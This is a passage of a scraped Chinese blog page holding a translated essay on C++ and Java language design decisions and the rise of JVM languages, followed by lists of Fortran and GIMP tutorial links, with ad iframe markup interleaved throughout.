3D9e901dee91efdf69-22ff1190d2e00036%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_MbLGni1bFCkd9AOH-v6XDlpw8cOlw&amp;gpic=UID%3D00000c061ced07bd%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_Man7QoYeFMGhiWqMULZZFElgrNWCA&amp;prev_fmts=0x0%2C1200x280%2C704x280&amp;nras=4&amp;correlator=7407528332024&amp;frm=20&amp;pv=1&amp;ga_vid=1186066521.1684141867&amp;ga_sid=1684141867&amp;ga_hid=2010636305&amp;ga_fc=1&amp;u_tz=480&amp;u_his=1&amp;u_h=915&amp;u_w=1463&amp;u_ah=867&amp;u_aw=1463&amp;u_cd=24&amp;u_sd=1.75&amp;dmc=8&amp;adx=225&amp;ady=1340&amp;biw=1447&amp;bih=764&amp;scr_x=0&amp;scr_y=300&amp;eid=44759927%2C44759876%2C44759842%2C44773810%2C44788442%2C44790154&amp;oid=2&amp;psts=ABHeCvgS5g2yEvk2Qfujki45d-T_pX26WC2lpqGK1JW8UzgXELUUOcED8Foe2c4zV1r-EgWCRAe27qZGJSyQm-qDEH3c95M&amp;pvsid=3438896626745179&amp;tmod=1102801285&amp;uas=3&amp;nvt=1&amp;ref=https%3A%2F%2Fcoolshell.cn%2Fpage%2F70&amp;fc=1408&amp;brdim=0%2C0%2C0%2C0%2C1463%2C0%2C1463%2C867%2C1463%2C764&amp;vis=1&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=128&amp;bc=31&amp;jar=2023-05-15-08&amp;ifi=4&amp;uci=a!4&amp;btvi=2&amp;fsb=1&amp;xpc=MfW3udaVFo&amp;p=https%3A//coolshell.cn&amp;dtd=45" data-google-container-id="a!4" data-google-query-id="CO2irMH99v4CFWvHTAIdf9IDGA" data-load-complete="true" style="box-sizing: border-box; max-width: 100%; width: 704px; left: 0px; top: 0px; border: 0px; height: 280px;"></iframe>

因为我曾经是C++标准委员会的一员，我目睹了这些决议的产生。这些C++决议都是在经过超级深思熟虑的考虑之后在做出，他们远比大多数Java的决议更为谨慎小心。

然而，就像有些人准确地指出那样，C++是复杂而难于使用的，并且充满了各种个样容易让人忘记的古怪的规则。当我在写书的时候，我只能从规范中找到这些规则的说明，而不是自己能记住这些规则。

为了让人们理解C++这门语言如何即难用、复杂，同时还要有良好的设计，你必须记住一条C++中最主要的设计原则——兼容C语言。这是Stroupstru最正确的决定，这样做将会出现一条让大量的C程序员通向C++程序的捷径：这条捷径允许C程序员不需要做任何修改就可以在C++下编译程序。然而，这也成为了C++语言巨大的约束，它给C++带来了强大的力量，同时也给C++带来了无尽的痛楚。正是因为这个约束导致了C++如此的成功，并且也如此的复杂。

<iframe id="aswift_4" name="aswift_4" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" width="704" height="280" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-3415450859608158&amp;output=html&amp;h=280&amp;adk=665786259&amp;adf=2009410015&amp;pi=t.aa~a.425447425~i.21~rp.4&amp;daaos=1684125332196&amp;w=704&amp;fwrn=4&amp;fwrnh=100&amp;lmt=1684141032&amp;num_ads=1&amp;rafmt=1&amp;armr=3&amp;sem=mc&amp;pwprc=9848079135&amp;ad_type=text_image&amp;format=704x280&amp;url=https%3A%2F%2Fcoolshell.cn%2Farticles%2F209.html&amp;fwr=0&amp;pra=3&amp;rh=176&amp;rw=703&amp;rpe=1&amp;resp_fmts=3&amp;wgl=1&amp;fa=27&amp;adsid=ChEI8LCHowYQ1PStmYmQo8OEARI5ANXa3biIBTfRAnlNgxyr1MVrhxmYgHsfI1l35ots8vJyv-XZuFjV1rvzT7RPzZ1Vid_KuWY3kg7Y&amp;uach=WyJXaW5kb3dzIiwiMTUuMC4wIiwieDg2IiwiIiwiMTEzLjAuNTY3Mi45MyIsW10sMCxudWxsLCI2NCIsW1siR29vZ2xlIENocm9tZSIsIjExMy4wLjU2NzIuOTMiXSxbIkNocm9taXVtIiwiMTEzLjAuNTY3Mi45MyJdLFsiTm90LUEuQnJhbmQiLCIyNC4wLjAuMCJdXSwwXQ..&amp;dt=1684141907977&amp;bpp=1&amp;bdt=2716&amp;idt=-M&amp;shv=r20230510&amp;mjsv=m202305090101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;cookie=ID%3D9e901dee91efdf69-22ff1190d2e00036%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_MbLGni1bFCkd9AOH-v6XDlpw8cOlw&amp;gpic=UID%3D00000c061ced07bd%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_Man7QoYeFMGhiWqMULZZFElgrNWCA&amp;prev_fmts=0x0%2C1200x280%2C704x280%2C704x280&amp;nras=5&amp;correlator=7407528332024&amp;frm=20&amp;pv=1&amp;ga_vid=1186066521.1684141867&amp;ga_sid=1684141867&amp;ga_hid=2010636305&amp;ga_fc=1&amp;u_tz=480&amp;u_his=1&amp;u_h=915&amp;u_w=1463&amp;u_ah=867&amp;u_aw=1463&amp;u_cd=24&amp;u_sd=1.75&amp;dmc=8&amp;adx=225&amp;ady=2028&amp;biw=1447&amp;bih=764&amp;scr_x=0&amp;scr_y=300&amp;eid=44759927%2C44759876%2C44759842%2C44773810%2C44788442%2C44790154&amp;oid=2&amp;psts=ABHeCvgS5g2yEvk2Qfujki45d-T_pX26WC2lpqGK1JW8UzgXELUUOcED8Foe2c4zV1r-EgWCRAe27qZGJSyQm-qDEH3c95M&amp;pvsid=3438896626745179&amp;tmod=1102801285&amp;uas=3&amp;nvt=1&amp;ref=https%3A%2F%2Fcoolshell.cn%2Fpage%2F70&amp;fc=1408&amp;brdim=0%2C0%2C0%2C0%2C1463%2C0%2C1463%2C867%2C1463%2C764&amp;vis=1&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=128&amp;bc=31&amp;jar=2023-05-15-08&amp;ifi=5&amp;uci=a!5&amp;btvi=3&amp;fsb=1&amp;xpc=2Q8nVgO5fr&amp;p=https%3A//coolshell.cn&amp;dtd=49" data-google-container-id="a!5" data-google-query-id="CLvcrMH99v4CFfXOTAIdP6QAaw" data-load-complete="true" style="box-sizing: border-box; max-width: 100%; width: 704px; left: 0px; top: 0px; border: 0px; height: 280px;"></iframe>

这些C++古怪的条约使那些没有完全了解C++的Java的设计者们犯了傻。例如，他们认为程序员能用好操作符重载将会是非常困难的一件事。但是操作符重载在C++中却是必须的，因为在C++中有栈分配，同时又有堆上的分配，你只有通过重载好操作符来处理好不同类型的内存分配，并保证不会产生内存泄漏，的确是难！但对Java来说，因为Java只有单一的一种内存分配机制（**译者注：**Java基本上是采用堆分配）和垃圾回收机制，这样操作符重载在Java中就变得多余（正如C#的操作符重载，和更早之前的Python操作重载，但是Python出现的要比Java早）。但是多年以来，来自Java的团队就一致认为“操作符重载太过复杂”。这一决议或其他的一些Java决议，明显说明了很多Java的设计者在做出决议的时候没有做足自己的工作，这也是为什么我有了一个藐视由Gosling和他的Java团队所做决议的名声。

<iframe id="aswift_6" name="aswift_6" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" width="704" height="280" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-3415450859608158&amp;output=html&amp;h=280&amp;adk=665786259&amp;adf=4275561286&amp;pi=t.aa~a.425447425~i.23~rp.4&amp;daaos=1684125332196&amp;w=704&amp;fwrn=4&amp;fwrnh=100&amp;lmt=1684141032&amp;num_ads=1&amp;rafmt=1&amp;armr=3&amp;sem=mc&amp;pwprc=9848079135&amp;ad_type=text_image&amp;format=704x280&amp;url=https%3A%2F%2Fcoolshell.cn%2Farticles%2F209.html&amp;fwr=0&amp;pra=3&amp;rh=176&amp;rw=703&amp;rpe=1&amp;resp_fmts=3&amp;wgl=1&amp;fa=27&amp;adsid=ChEI8LCHowYQ1PStmYmQo8OEARI5ANXa3biIBTfRAnlNgxyr1MVrhxmYgHsfI1l35ots8vJyv-XZuFjV1rvzT7RPzZ1Vid_KuWY3kg7Y&amp;uach=WyJXaW5kb3dzIiwiMTUuMC4wIiwieDg2IiwiIiwiMTEzLjAuNTY3Mi45MyIsW10sMCxudWxsLCI2NCIsW1siR29vZ2xlIENocm9tZSIsIjExMy4wLjU2NzIuOTMiXSxbIkNocm9taXVtIiwiMTEzLjAuNTY3Mi45MyJdLFsiTm90LUEuQnJhbmQiLCIyNC4wLjAuMCJdXSwwXQ..&amp;dt=1684141907977&amp;bpp=1&amp;bdt=2716&amp;idt=1&amp;shv=r20230510&amp;mjsv=m202305090101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;cookie=ID%3D9e901dee91efdf69-22ff1190d2e00036%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_MbLGni1bFCkd9AOH-v6XDlpw8cOlw&amp;gpic=UID%3D00000c061ced07bd%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_Man7QoYeFMGhiWqMULZZFElgrNWCA&amp;prev_fmts=0x0%2C1200x280%2C704x280%2C704x280%2C704x280%2C704x280&amp;nras=7&amp;correlator=7407528332024&amp;frm=20&amp;pv=1&amp;ga_vid=1186066521.1684141867&amp;ga_sid=1684141867&amp;ga_hid=2010636305&amp;ga_fc=1&amp;u_tz=480&amp;u_his=1&amp;u_h=915&amp;u_w=1463&amp;u_ah=867&amp;u_aw=1463&amp;u_cd=24&amp;u_sd=1.75&amp;dmc=8&amp;adx=225&amp;ady=2650&amp;biw=1447&amp;bih=764&amp;scr_x=0&amp;scr_y=300&amp;eid=44759927%2C44759876%2C44759842%2C44773810%2C44788442%2C44790154&amp;oid=2&amp;psts=ABHeCvgS5g2yEvk2Qfujki45d-T_pX26WC2lpqGK1JW8UzgXELUUOcED8Foe2c4zV1r-EgWCRAe27qZGJSyQm-qDEH3c95M&amp;pvsid=3438896626745179&amp;tmod=1102801285&amp;uas=3&amp;nvt=1&amp;ref=https%3A%2F%2Fcoolshell.cn%2Fpage%2F70&amp;fc=1408&amp;brdim=0%2C0%2C0%2C0%2C1463%2C0%2C1463%2C867%2C1463%2C764&amp;vis=1&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=128&amp;bc=31&amp;jar=2023-05-15-08&amp;ifi=7&amp;uci=a!7&amp;btvi=5&amp;fsb=1&amp;xpc=lXG7NpUWu0&amp;p=https%3A//coolshell.cn&amp;dtd=56" data-google-container-id="a!7" data-google-query-id="CNfhrMH99v4CFQUbKgodXwwLPw" data-load-complete="true" style="box-sizing: border-box; max-width: 100%; width: 704px; left: 0px; top: 0px; border: 0px; height: 280px;"></iframe>

同样还有太多太多的例子，基本类型“因为性能原因被引入”。真正的原因是为了坚持“所有都是对象”，并且同时为底层具有效率要求的程序提供一个后门（同时这也使得一些热点技术执行起来更有效率）。噢，但是事实是，你没有办法直接使用浮点处理器来进行超越函数的计算（**译者注：**[Transcendental Functions ](https://en.wikipedia.org/wiki/Transcendental_function)，一种微积分的函数），而只能使用软件来计算，但原本这类函数就可以使用浮点计算处理器来计算的。我尽我所能将类似这样的问题罗列出来，但是我听到的结果却总是那些无用的回答“这就是Java的方式”。

当我写下泛型是个如何糟糕的设计时，我得到了同样的回应，“我们必须兼容之前的（糟糕的）Java的决议”。最后越来越多的人们获得了足够关于泛型是多难用的经验——的确，C++的泛型更强大，一致性更好（尤其现在当编译器的错误信息越来越清晰后，泛型也比以前更好使用），因为Java泛型设计很差，很难，所以人们又开始回到认真对待具现化而不是泛型，当然，这对语言是有帮助的，因为具现化这个东西并不会消弱太多的语言设计，也不会因为这些自我限制而导致语言缺陷。

<iframe id="aswift_5" name="aswift_5" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" width="704" height="280" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-3415450859608158&amp;output=html&amp;h=280&amp;adk=665786259&amp;adf=4275561286&amp;pi=t.aa~a.425447425~i.27~rp.4&amp;daaos=1684125332196&amp;w=704&amp;fwrn=4&amp;fwrnh=100&amp;lmt=1684141032&amp;num_ads=1&amp;rafmt=1&amp;armr=3&amp;sem=mc&amp;pwprc=9848079135&amp;ad_type=text_image&amp;format=704x280&amp;url=https%3A%2F%2Fcoolshell.cn%2Farticles%2F209.html&amp;fwr=0&amp;pra=3&amp;rh=176&amp;rw=703&amp;rpe=1&amp;resp_fmts=3&amp;wgl=1&amp;fa=27&amp;adsid=ChEI8LCHowYQ1PStmYmQo8OEARI5ANXa3biIBTfRAnlNgxyr1MVrhxmYgHsfI1l35ots8vJyv-XZuFjV1rvzT7RPzZ1Vid_KuWY3kg7Y&amp;uach=WyJXaW5kb3dzIiwiMTUuMC4wIiwieDg2IiwiIiwiMTEzLjAuNTY3Mi45MyIsW10sMCxudWxsLCI2NCIsW1siR29vZ2xlIENocm9tZSIsIjExMy4wLjU2NzIuOTMiXSxbIkNocm9taXVtIiwiMTEzLjAuNTY3Mi45MyJdLFsiTm90LUEuQnJhbmQiLCIyNC4wLjAuMCJdXSwwXQ..&amp;dt=1684141907977&amp;bpp=1&amp;bdt=2717&amp;idt=-M&amp;shv=r20230510&amp;mjsv=m202305090101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;cookie=ID%3D9e901dee91efdf69-22ff1190d2e00036%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_MbLGni1bFCkd9AOH-v6XDlpw8cOlw&amp;gpic=UID%3D00000c061ced07bd%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_Man7QoYeFMGhiWqMULZZFElgrNWCA&amp;prev_fmts=0x0%2C1200x280%2C704x280%2C704x280%2C704x280&amp;nras=6&amp;correlator=7407528332024&amp;frm=20&amp;pv=1&amp;ga_vid=1186066521.1684141867&amp;ga_sid=1684141867&amp;ga_hid=2010636305&amp;ga_fc=1&amp;u_tz=480&amp;u_his=1&amp;u_h=915&amp;u_w=1463&amp;u_ah=867&amp;u_aw=1463&amp;u_cd=24&amp;u_sd=1.75&amp;dmc=8&amp;adx=225&amp;ady=3352&amp;biw=1447&amp;bih=764&amp;scr_x=0&amp;scr_y=300&amp;eid=44759927%2C44759876%2C44759842%2C44773810%2C44788442%2C44790154&amp;oid=2&amp;psts=ABHeCvgS5g2yEvk2Qfujki45d-T_pX26WC2lpqGK1JW8UzgXELUUOcED8Foe2c4zV1r-EgWCRAe27qZGJSyQm-qDEH3c95M&amp;pvsid=3438896626745179&amp;tmod=1102801285&amp;uas=3&amp;nvt=1&amp;ref=https%3A%2F%2Fcoolshell.cn%2Fpage%2F70&amp;fc=1408&amp;brdim=0%2C0%2C0%2C0%2C1463%2C0%2C1463%2C867%2C1463%2C764&amp;vis=1&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=128&amp;bc=31&amp;jar=2023-05-15-08&amp;ifi=6&amp;uci=a!6&amp;btvi=4&amp;fsb=1&amp;xpc=3s7CpN50tw&amp;p=https%3A//coolshell.cn&amp;dtd=52" data-google-container-id="a!6" data-google-query-id="CKvMrcH99v4CFQFMYAodi30Myw" data-load-complete="true" style="box-sizing: border-box; max-width: 100%; width: 704px; left: 0px; top: 0px; border: 0px; height: 280px;"></iframe>

那个Java的问题列表在这些沉闷的回应面前只能显得单调乏味。那么，是不是这样就意味着Java是失败的语言设计呢？绝对不是，Java将主流程序员带入到了一个垃圾收集器、虚拟机、一致的错误处理模型的世界(如果你不使用异常处理，这类异常可能是非常有用的异常，正如我在《Think in Java 》4ed中演示的那样)。伴随着它设计上种种缺陷，Java把我们带领到了一个更高的层次，在这个层次上我们正在准备着迎接更为高级别的语言。

另一个观点，人们一直认为C++是语言中的先驱，许多人也认为Java是语言的先驱。但是因为虚拟机，Java使得自己更容易被别的语言替代。现在任何人都有可能快速创建一门新的语言，并且和Java具有一样的效率；而以前，要得到一个正确的，有效率的编译器花去了开发一门新语言的大部分时间。

现在，我们正在见证这一切的发生——不管是更高级的静态语言，例如Scala，或者说是动态语言（**译者注**：Dynamic Language，如Python或Ruby），不管是新的还是移植的，例如Groovy ，JRuby和Jython。这就是未来的趋势，并且其过度将会非常的平滑，因为你可以在已有的Java代码中使用这些新语言，如果有需要，你甚至可以重写Java中产生有性能瓶颈的地方。

<iframe id="aswift_2" name="aswift_2" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" width="704" height="280" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-3415450859608158&amp;output=html&amp;h=280&amp;adk=665786259&amp;adf=4233962937&amp;pi=t.aa~a.425447425~i.33~rp.4&amp;daaos=1684125332196&amp;w=704&amp;fwrn=4&amp;fwrnh=100&amp;lmt=1684141032&amp;num_ads=1&amp;rafmt=1&amp;armr=3&amp;sem=mc&amp;pwprc=9848079135&amp;ad_type=text_image&amp;format=704x280&amp;url=https%3A%2F%2Fcoolshell.cn%2Farticles%2F209.html&amp;fwr=0&amp;pra=3&amp;rh=176&amp;rw=703&amp;rpe=1&amp;resp_fmts=3&amp;wgl=1&amp;fa=27&amp;adsid=ChEI8LCHowYQ1PStmYmQo8OEARI5ANXa3biIBTfRAnlNgxyr1MVrhxmYgHsfI1l35ots8vJyv-XZuFjV1rvzT7RPzZ1Vid_KuWY3kg7Y&amp;uach=WyJXaW5kb3dzIiwiMTUuMC4wIiwieDg2IiwiIiwiMTEzLjAuNTY3Mi45MyIsW10sMCxudWxsLCI2NCIsW1siR29vZ2xlIENocm9tZSIsIjExMy4wLjU2NzIuOTMiXSxbIkNocm9taXVtIiwiMTEzLjAuNTY3Mi45MyJdLFsiTm90LUEuQnJhbmQiLCIyNC4wLjAuMCJdXSwwXQ..&amp;dt=1684141907977&amp;bpp=1&amp;bdt=2716&amp;idt=-M&amp;shv=r20230510&amp;mjsv=m202305090101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;cookie=ID%3D9e901dee91efdf69-22ff1190d2e00036%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_MbLGni1bFCkd9AOH-v6XDlpw8cOlw&amp;gpic=UID%3D00000c061ced07bd%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_Man7QoYeFMGhiWqMULZZFElgrNWCA&amp;prev_fmts=0x0%2C1200x280&amp;nras=3&amp;correlator=7407528332024&amp;frm=20&amp;pv=1&amp;ga_vid=1186066521.1684141867&amp;ga_sid=1684141867&amp;ga_hid=2010636305&amp;ga_fc=1&amp;u_tz=480&amp;u_his=1&amp;u_h=915&amp;u_w=1463&amp;u_ah=867&amp;u_aw=1463&amp;u_cd=24&amp;u_sd=1.75&amp;dmc=8&amp;adx=225&amp;ady=4132&amp;biw=1447&amp;bih=764&amp;scr_x=0&amp;scr_y=300&amp;eid=44759927%2C44759876%2C44759842%2C44773810%2C44788442%2C44790154&amp;oid=2&amp;psts=ABHeCvgS5g2yEvk2Qfujki45d-T_pX26WC2lpqGK1JW8UzgXELUUOcED8Foe2c4zV1r-EgWCRAe27qZGJSyQm-qDEH3c95M&amp;pvsid=3438896626745179&amp;tmod=1102801285&amp;uas=3&amp;nvt=1&amp;ref=https%3A%2F%2Fcoolshell.cn%2Fpage%2F70&amp;fc=1408&amp;brdim=0%2C0%2C0%2C0%2C1463%2C0%2C1463%2C867%2C1463%2C764&amp;vis=1&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=128&amp;bc=31&amp;jar=2023-05-15-08&amp;ifi=3&amp;uci=a!3&amp;btvi=1&amp;fsb=1&amp;xpc=oBtnD58bBD&amp;p=https%3A//coolshell.cn&amp;dtd=22" data-google-container-id="a!3" data-google-query-id="CLPwqsH99v4CFVQcKgodlRYLFQ" data-load-complete="true" style="box-sizing: border-box; max-width: 100%; width: 704px; left: 0px; top: 0px; border: 0px; height: 280px;"></iframe>

正如C++会消亡一样，Java自生有可能消亡，或着被用于特殊环境之下（或仅仅是为了支持以前遗留的代码，因为Java并不像C++那样会被用于硬件编程）。但是Java 真正的亮点，也是意料之外的收获，就是如果当Java已经到了自身没法在进化的地步时，Java已经为其替代者创建一条平滑之路。所有未来的语言都将从这里学到：要么为自己创建一种可以不断重构(进化)(正如Python和Ruby做的那样)的文化，要么就让其竞争者发展壮大。

# 非常不错的编程技术教程


[Professional Programmer’s Guide to Fortran 77](ftp://ftp.star.le.ac.uk/pub/fortran/)
[Fortran 90 and Computational Science](http://csep1.phy.ornl.gov/pl/pl.html)
[User Notes on Fortran Programming](http://metalab.unc.edu/pub/languages/fortran/unfp.html)
[Fortran Programming for Physics and Astronomy](http://noether.vassar.edu/~myers/Fortran.html)
[A Fortran 90 Tutorial](http://www.astro.unibas.ch/F90Tutorial/tutorial.html)
[Using GNU Fortran](http://www.delorie.com/gnu/docs/g77/g77_1.html)
[Fortran 90: A Course for Fortran 77 Programmers](http://www.hpctec.mcc.ac.uk/hpctec/courses/Fortran90/F90course.html)
[Fortran 90 for the Fortran 77 Programmer](http://www.nsc.liu.se/f77to90.html)
[Introduction to Fortran](http://www.stanford.edu/class/sccm001/)

<iframe id="aswift_7" name="aswift_7" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" width="704" height="280" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-3415450859608158&amp;output=html&amp;h=280&amp;adk=316722513&amp;adf=1799346023&amp;pi=t.aa~a.425447425~i.19~rp.4&amp;daaos=1684125332196&amp;w=704&amp;fwrn=4&amp;fwrnh=100&amp;lmt=1684135376&amp;num_ads=1&amp;rafmt=1&amp;armr=3&amp;sem=mc&amp;pwprc=9848079135&amp;format=704x280&amp;url=https%3A%2F%2Fcoolshell.cn%2Farticles%2F240.html&amp;fwr=0&amp;pra=3&amp;rh=176&amp;rw=703&amp;rpe=1&amp;resp_fmts=3&amp;wgl=1&amp;fa=27&amp;adsid=ChEI8LCHowYQ1PStmYmQo8OEARI5ANXa3bi7Tw-MwjaDD2ulFnHObBfzYKUP-uyaetgVtnFwGJC_lPO2bO88Dy3Idam--qxdjj2R0Mfp&amp;uach=WyJXaW5kb3dzIiwiMTUuMC4wIiwieDg2IiwiIiwiMTEzLjAuNTY3Mi45MyIsW10sMCxudWxsLCI2NCIsW1siR29vZ2xlIENocm9tZSIsIjExMy4wLjU2NzIuOTMiXSxbIkNocm9taXVtIiwiMTEzLjAuNTY3Mi45MyJdLFsiTm90LUEuQnJhbmQiLCIyNC4wLjAuMCJdXSwwXQ..&amp;dt=1684141930276&amp;bpp=1&amp;bdt=3313&amp;idt=1&amp;shv=r20230510&amp;mjsv=m202305090101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;cookie=ID%3D9e901dee91efdf69-22ff1190d2e00036%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_MbLGni1bFCkd9AOH-v6XDlpw8cOlw&amp;gpic=UID%3D00000c061ced07bd%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_Man7QoYeFMGhiWqMULZZFElgrNWCA&amp;prev_fmts=0x0%2C1200x280%2C1447x764%2C728x90%2C704x280&amp;nras=6&amp;correlator=3624695096323&amp;frm=20&amp;pv=1&amp;ga_vid=1186066521.1684141867&amp;ga_sid=1684141867&amp;ga_hid=670395484&amp;ga_fc=1&amp;u_tz=480&amp;u_his=1&amp;u_h=915&amp;u_w=1463&amp;u_ah=867&amp;u_aw=1463&amp;u_cd=24&amp;u_sd=1.75&amp;dmc=8&amp;adx=225&amp;ady=4640&amp;biw=1447&amp;bih=764&amp;scr_x=0&amp;scr_y=1652&amp;eid=44759927%2C44759876%2C44759842%2C44773810%2C31073764%2C44782468%2C44788442%2C44789923&amp;oid=2&amp;psts=ABHeCviHYgOwj1kQnfNpHfcc8wlmJan6r5SZlpSyLuzzqQ3gPpNZj_H_c40gvUbt1VXRnYoLk73iK-8Ds7SPdWc0x-qS&amp;pvsid=1928529129288586&amp;tmod=1102801285&amp;uas=3&amp;nvt=1&amp;ref=https%3A%2F%2Fcoolshell.cn%2Fpage%2F70&amp;fc=1408&amp;brdim=0%2C0%2C0%2C0%2C1463%2C0%2C1463%2C867%2C1463%2C764&amp;vis=1&amp;rsz=%7C%7Cs%7C&amp;abl=NS&amp;fu=128&amp;bc=31&amp;jar=2023-05-15-08&amp;ifi=8&amp;uci=a!8&amp;btvi=3&amp;fsb=1&amp;xpc=AUpuTcLNE6&amp;p=https%3A//coolshell.cn&amp;dtd=7885" data-google-container-id="a!8" data-google-query-id="CNzs28_99v4CFdizlgodAhYEJA" data-load-complete="true" style="box-sizing: border-box; max-width: 100%; width: 704px; left: 0px; top: 0px; border: 0px; height: 280px;"></iframe>

**GIMP**
[GIMP Tutorial Index](http://empyrean.lib.ndsu.nodak.edu/~nem/gimp/tuts/)
[A Tutorial for Perl GIMP Users](http://imagic.weizmann.ac.il/~dov/gimp/perl-tut.html)
[A Scheme Tutorial for GIMP Users](http://imagic.weizmann.ac.il/~dov/gimp/scheme-tut.html)
[GIMP Guide](http://jgo.local.net/GimpGuide/)
[The GIMP User Manual](http://manual.gimp.org/)
[Pseudo 3-D with GIMP](http://www.linuxfocus.org/English/July2000/article113.shtml)
[Graphical Photocomposition with GIMP](http://www.linuxfocus.org/English/March1998/article9.html)
[Creating Text with the GIMP](http://www.linuxfocus.org/English/May1998/article10.html)
[Creating Fire Effects with the GIMP](http://www.linuxfocus.org/English/November1999/article112.html)
[Creating and Editing Animations with GIMP](http://www.linuxfocus.org/English/articles/article28.html)
[GIMP-Perl: GIMP Scripting for the Rest of Us](http://www.linuxgazette.com/issue51/mauerer.html)
[Writing a GIMP Plugin](http://www.oberlin.edu/~kturner/gimp/doc/)
[GIMP: The RRU Tutorial](http://www.rru.com/~meo/gimp/Tutorial/)
[GIMP User FAQ](http://www.rru.com/~meo/gimp/faq-user.html)
[Script-Fu Tutorial](http://www.soulfry.com/script-fu/index.html)
[The Quick Start Guide to the GIMP, Part 1](http://www2.linuxjournal.com/lj-issues/issue43/2388.html)
[The Quick Start Guide to the GIMP, Part 2](http://www2.linuxjournal.com/lj-issues/issue44/2530.html)
[The Quick Start Guide to the GIMP, Part 3](http://www2.linuxjournal.com/lj-issues/issue45/2531.html)
[The Quick Start Guide to the GIMP, Part 4](http://www2.linuxjournal.com/lj-issues/issue46/2532.html)

<iframe id="aswift_4" name="aswift_4" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" width="704" height="280" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" src="https://googleads.g.doubleclick.net/pagead/ads?client=ca-pub-3415450859608158&amp;output=html&amp;h=280&amp;adk=316722513&amp;adf=1799346023&amp;pi=t.aa~a.425447425~i.21~rp.4&amp;daaos=1684125332196&amp;w=704&amp;fwrn=4&amp;fwrnh=100&amp;lmt=1684135376&amp;num_ads=1&amp;rafmt=1&amp;armr=3&amp;sem=mc&amp;pwprc=9848079135&amp;format=704x280&amp;url=https%3A%2F%2Fcoolshell.cn%2Farticles%2F240.html&amp;fwr=0&amp;pra=3&amp;rh=176&amp;rw=703&amp;rpe=1&amp;resp_fmts=3&amp;wgl=1&amp;fa=27&amp;adsid=ChEI8LCHowYQ1PStmYmQo8OEARI5ANXa3bi7Tw-MwjaDD2ulFnHObBfzYKUP-uyaetgVtnFwGJC_lPO2bO88Dy3Idam--qxdjj2R0Mfp&amp;uach=WyJXaW5kb3dzIiwiMTUuMC4wIiwieDg2IiwiIiwiMTEzLjAuNTY3Mi45MyIsW10sMCxudWxsLCI2NCIsW1siR29vZ2xlIENocm9tZSIsIjExMy4wLjU2NzIuOTMiXSxbIkNocm9taXVtIiwiMTEzLjAuNTY3Mi45MyJdLFsiTm90LUEuQnJhbmQiLCIyNC4wLjAuMCJdXSwwXQ..&amp;dt=1684141930256&amp;bpp=2&amp;bdt=3294&amp;idt=2&amp;shv=r20230510&amp;mjsv=m202305090101&amp;ptt=9&amp;saldr=aa&amp;abxe=1&amp;cookie=ID%3D9e901dee91efdf69-22ff1190d2e00036%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_MbLGni1bFCkd9AOH-v6XDlpw8cOlw&amp;gpic=UID%3D00000c061ced07bd%3AT%3D1684141906%3ART%3D1684141906%3AS%3DALNI_Man7QoYeFMGhiWqMULZZFElgrNWCA&amp;prev_fmts=0x0%2C1200x280%2C1447x764%2C728x90%2C704x280%2C704x280&amp;nras=7&amp;correlator=3624695096323&amp;frm=20&amp;pv=1&amp;ga_vid=1186066521.1684141867&amp;ga_sid=1684141867&amp;ga_hid=670395484&amp;ga_fc=1&amp;u_tz=480&amp;u_his=1&amp;u_h=915&amp;u_w=1463&amp;u_ah=867&amp;u_aw=1463&amp;u_cd=24&amp;u_sd=1.75&amp;dmc=8&amp;adx=225&amp;ady=5594&amp;biw=1447&amp;bih=764&amp;scr_x=0&amp;scr_y=2551&amp;eid=44759927%2C44759876%2C44759842%2C44773810%2C31073764%2C44782468%2C44788442%2C44789923&amp;oid=2&amp;psts=ABHeCviHYgOwj1kQnfNpHfcc8wlmJan6r5SZlpSyLuzzqQ3gPpNZj_H_c40gvUbt1VXRnYoLk73iK-8Ds